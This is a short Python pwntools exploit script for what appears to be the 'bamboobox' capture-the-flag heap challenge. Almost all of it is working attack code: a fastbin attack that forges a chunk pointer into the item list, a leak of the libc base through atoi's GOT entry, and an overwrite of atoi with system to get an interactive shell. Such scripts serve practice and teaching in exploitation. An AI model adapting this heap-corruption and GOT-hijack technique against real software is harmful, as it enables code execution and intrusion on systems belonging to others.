#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: 2020.11.16 13.50.11
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

#context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./bamboobox')
#libc = ELF('null')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')

def add(size,cont):
	sh.sendlineafter('choice:','2')
	sh.sendlineafter('length of item name:',str(size))
	sh.sendafter('name of item:',str(cont))

def edit(index,size,cont):
	sh.sendlineafter('choice:','3')
	sh.sendlineafter('index of item:',str(index))
	sh.sendlineafter('length of item name:',str(size))
	sh.sendafter('new name of the item:',str(cont))

def delete(index):
	sh.sendlineafter('choice:','4')
	sh.sendlineafter('index of item:',str(index))

def show():
	sh.sendlineafter('choice:','1')
	
def show_addr(name,addr):
	log.success('The '+str(name)+' Addr:' + str(hex(addr)))

sh = process('./bamboobox')
#sh = remote('ip',port)

#fastbin attack
itemlist = 0x6020c0
add(0x21,'A'*0x10) 		#0	
add(0x18,'B'*0x10)		#1
delete(1)
fake_chunk = itemlist-0x8
payload1 = 'A'*0x28 + p64(0x21) + p64(fake_chunk)
edit(0,0x100,payload1)
add(0x18,'B'*0x10)
add(0x18,p64(elf.got['atoi'])+'\x18')

#leaking
show()
sh.recvuntil('0 : ')
libc_addr = u64(sh.recv(6).ljust(8,'\x00')) - libc.sym['atoi']
system_addr = libc_addr + libc.sym['system']

show_addr('libc_addr',libc_addr)
show_addr('system_addr',system_addr)

#hijacking
edit(0,0x18,p64(system_addr))
#gdb.attach(sh)


sh.interactive()
